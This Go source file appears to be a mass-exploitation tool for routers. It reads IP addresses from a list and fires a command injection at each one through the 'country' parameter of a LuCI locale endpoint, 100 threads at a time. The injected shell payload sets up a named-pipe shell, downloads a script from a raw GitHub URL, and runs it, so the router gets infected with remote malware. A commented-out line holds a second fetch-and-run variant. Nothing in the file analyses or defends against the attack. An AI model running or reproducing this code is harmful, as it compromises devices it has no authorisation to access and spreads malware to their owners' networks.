package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/ogier/pflag"
	"github.com/zenthangplus/goccm"
)

var (
	devices = []string{}
	payload string
	host    string
	port    string
	threads int
	client  *http.Client
)

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func request(ip string) {
	for i := 0; i < 2; i++ {
		resp, err := http.Get(fmt.Sprintf("https://%s/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(%s)", ip, payload))
		if err != nil {
//			fmt.Printf("\x1b[31mFAIL\x1b[0m : [%s]\n", ip)
			return
		}
		if resp.StatusCode == 200 {
			fmt.Printf("\x1b[32mSUCCESS\x1b[0m : [%s]\n", ip)
		}
		fmt.Printf("\x1b[33mSTATUS\x1b[0m : [%s]\n", resp.Status)
		defer resp.Body.Close()
	}
}

func main() {
	pflag.StringVar(&host, "host", "localhost", "Hostname or IP address")
	pflag.StringVar(&port, "port", "80", "Port number")
	pflag.IntVar(&threads, "threads", 100, "Number of threads")
	pflag.Parse()

	if pflag.NFlag() == 0 {
		pflag.Usage()
		os.Exit(0)
	}
	client = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	devices, _ = readLines("list.txt")
	c := goccm.New(threads)
        shellPayload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh;chmod 777 *;sh skfnw.sh")
//	shellPayload := fmt.Sprintf("cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh")
	payload = strings.ReplaceAll(url.QueryEscape(shellPayload), "+", "%20")
	for _, device := range devices {
		c.Wait()
		go func(device string) {
			request(device)
			c.Done()
		}(device)
	}
}
